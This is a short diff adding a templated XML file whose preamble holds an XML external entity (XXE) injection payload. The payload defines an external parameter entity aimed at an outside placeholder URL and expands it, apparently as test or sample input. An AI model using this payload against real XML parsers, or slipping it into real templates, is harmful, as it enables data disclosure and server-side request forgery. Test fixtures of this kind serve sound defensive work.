@@ -1,0 +1,4 @@
+{% extends "base.xml" %}
+{% block pre %}<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://example.org/#!/auth"> %xxe; ]>
+
+{% endblock pre %}
